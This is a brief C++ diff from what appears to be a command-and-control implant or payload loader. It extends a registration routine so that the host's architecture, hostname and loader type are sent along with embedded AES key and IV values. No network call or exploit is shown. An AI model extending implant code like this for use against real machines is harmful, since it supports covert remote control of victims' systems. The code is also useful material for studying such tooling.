@@ -8,6 +8,8 @@ namespace Handler
         std::wstring wArch = L"";
         std::wstring wHostname = L"";
         std::wstring wPayloadType = PAYLOAD_TYPE_W;
+        std::wstring wAesKey = AES_KEY_BASE64_W;
+        std::wstring wAesIV = AES_IV_BASE64_W;      
 
         // Get architecture
         SYSTEM_INFO systemInfo;
@@ -32,6 +34,10 @@ namespace Handler
         wJson += L"\"hostname\":\"" + wHostname + L"\"";
         wJson += L",";
         wJson += L"\"loaderType\":\"" + wPayloadType + L"\"";
+        wJson += L",";
+        wJson += L"\"aesKey\":\"" + wAesKey + L"\"";
+        wJson += L",";
+        wJson += L"\"aesIV\":\"" + wAesIV + L"\"";
         wJson += L"}";
 
         return wJson;
